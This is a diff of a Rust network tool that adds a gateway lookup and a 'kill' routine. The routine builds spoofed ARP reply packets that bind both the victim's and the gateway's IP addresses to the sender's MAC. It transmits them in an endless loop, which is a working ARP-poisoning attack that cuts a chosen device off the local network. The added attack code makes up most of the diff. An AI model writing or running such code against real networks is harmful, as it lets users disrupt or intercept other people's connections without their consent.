@@ -1,3 +1,4 @@
+use std::borrow::Borrow;
 use std::collections::HashMap;
 use std::net::{IpAddr, Ipv4Addr};
 use std::sync::atomic::{AtomicBool, Ordering};
@@ -28,17 +29,99 @@ pub struct TargetDetails {
     pub vendor: Option<String>,
 }
 
+pub fn find_gateway(inter: &NetworkInterface) -> TargetDetails {
+    let dev = netdev::get_interfaces()
+        .into_iter()
+        .find(|f| inter.name.contains(f.name.as_str()))
+        .unwrap();
+    let gateway = dev.gateway.expect("gateway ipv4 not found");
+    return TargetDetails {
+        hostname: None,
+        ipv4: gateway
+            .ipv4
+            .first()
+            .unwrap()
+            .to_string()
+            .parse()
+            .expect("failed to parse gateway ipv4"),
+        mac: gateway
+            .mac_addr
+            .address()
+            .parse()
+            .expect("can't get mac address of gateway"),
+        vendor: None,
+    };
+    //MacAddr::new(mac.0, mac.1, mac.2, mac.3, mac.4, mac.5),
+}
+
+pub fn kill(client: TargetDetails, gateway: TargetDetails, interface: &NetworkInterface) {
+    println!("{}", client.ipv4);
+    println!("{}", gateway.ipv4);
+    let source_mac = interface.mac.unwrap_or_else(|| {
+        eprintln!("Interface should have a MAC address");
+        process::exit(1);
+    });
+    let packets = vec![
+        create_kill_packet(client.ipv4, gateway.ipv4, source_mac, gateway.mac),
+        create_kill_packet(gateway.ipv4, client.ipv4, source_mac, client.mac),
+    ];
+    let (mut tx, mut rx) = create_data_link(interface);
+    loop {
+        for p in &packets {
+            tx.send_to(p.to_immutable().packet(), Some(interface.clone()));
+        }
+        thread::sleep(Duration::from_millis(1500));
+    }
+}
+
+pub fn create_kill_packet(
+    source_ip: Ipv4Addr,
+    dest_ip: Ipv4Addr,
+    source_mac: MacAddr,
+    dest_mac: MacAddr,
+) -> EthernetPacket<'static> {
+    let ethernet_buffer = vec![0u8; ETHERNET_STD_PACKET_SIZE];
+    let mut ethernet_packet = MutableEthernetPacket::owned(ethernet_buffer).unwrap_or_else(|| {
+        eprintln!("Could not build Ethernet packet");
+        process::exit(1);
+    });
+    ethernet_packet.set_destination(dest_mac);
+    ethernet_packet.set_source(source_mac);
+    ethernet_packet.set_ethertype(EtherTypes::Arp);
+
+    let mut arp_buffer = [0u8; ARP_PACKET_SIZE];
+    let mut arp_packet = MutableArpPacket::new(&mut arp_buffer).unwrap_or_else(|| {
+        eprintln!("Could not build ARP packet");
+        process::exit(1);
+    });
+
+    arp_packet.set_hardware_type(ArpHardwareTypes::Ethernet);
+    arp_packet.set_protocol_type(EtherTypes::Ipv4);
+    arp_packet.set_hw_addr_len(6);
+    arp_packet.set_proto_addr_len(4);
+    arp_packet.set_operation(ArpOperations::Reply);
+    arp_packet.set_sender_hw_addr(source_mac);
+    arp_packet.set_sender_proto_addr(source_ip);
+    arp_packet.set_target_hw_addr(dest_mac);
+    arp_packet.set_target_proto_addr(dest_ip);
+
+    ethernet_packet.set_payload(arp_packet.packet_mut());
+    let ethernet_packet = ethernet_packet.consume_to_immutable();
+    return ethernet_packet;
+}
+
 pub fn get_interfaces() -> Vec<NetworkInterface> {
     return pnet_datalink::interfaces();
 }
 
-pub fn scan(interface: &NetworkInterface) -> Vec<TargetDetails> {
+fn create_data_link(
+    interface: &NetworkInterface,
+) -> (Box<dyn DataLinkSender>, Box<dyn DataLinkReceiver>) {
     let channel_config = pnet_datalink::Config {
         read_timeout: Some(Duration::from_millis(DATALINK_RCV_TIMEOUT)),
         ..pnet_datalink::Config::default()
     };
-
-    let (mut tx, mut rx) = match pnet_datalink::channel(&interface, channel_config) {
+    return match pnet_datalink::channel(&interface, channel_config) {
         Ok(pnet_datalink::Channel::Ethernet(tx, rx)) => (tx, rx),
         Ok(_) => {
             eprintln!("Expected an Ethernet datalink channel");
@@ -49,6 +132,11 @@ pub fn scan(interface: &NetworkInterface) -> Vec<TargetDetails> {
             process::exit(1);
         }
     };
+}
+
+pub fn scan(interface: &NetworkInterface) -> Vec<TargetDetails> {
+    let (mut tx, mut rx) = create_data_link(interface);
+
     let timed_out = Arc::new(AtomicBool::new(false));
     let cloned_timed_out = Arc::clone(&timed_out);
     let arp_responses = thread::spawn(move || receive_arp_responses(&mut rx, cloned_timed_out));
